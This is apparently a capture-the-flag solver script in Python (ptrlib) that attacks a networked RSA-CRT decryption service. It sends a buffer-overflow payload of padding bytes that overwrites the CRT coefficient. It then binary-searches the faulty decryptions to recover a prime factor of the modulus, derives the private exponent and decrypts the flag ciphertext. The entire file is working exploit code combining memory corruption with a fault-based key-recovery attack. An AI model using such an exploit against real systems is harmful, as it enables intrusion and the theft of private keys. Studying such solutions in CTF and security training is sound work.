from ptrlib import p32, Socket, Process
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 10666))

sock = Socket(HOST, PORT)

n = int(sock.recvlineafter("n = "))
flag_c = int(sock.recvlineafter("c = "))
# print(n)

sock.sendlineafter("c = ", "123")
# u = int(sock.recvlineafter("u = "))
# print("[DEBUG] u before bof:", u)

payload = b"0\0"
payload += b"A"*(0x250 - len(payload))
payload += p32(4) + p32(4) # whatever other than 0x09
sock.sendlineafter("c = ", payload)
# u = int(sock.recvlineafter("u = "))
# print("[DEBUG] u after bof:", u)

ng, ok = 0, n
cnt = 0
while abs(ok - ng) > 1:
    # if q_ < q
    #  mp = mq = q_ so mp - mq is zero. this means corrupting u doesn't effect
    #  thus dec(enc(q_)) = mq = q_
    # else
    #  mp /= mq so mp - mq is not zero. so decryption fails because of corruption of u
    q_ = (ng + ok) // 2
    c = pow(q_, 65537, n)
    sock.sendlineafter("c = ", str(c))
    m_ = int(sock.recvlineafter("m = "))
    if m_ == q_:
        ng = q_
    else:
        ok = q_

assert n % q_ == 0 and n != q_
p, q = n // q_, q_
e = 1333
d = pow(e, -1, (p-1)*(q-1))
m = pow(flag_c, d, n)

ans = pow(m, 65537, n)
sock.sendlineafter("c = ", str(ans))
sock.interactive()
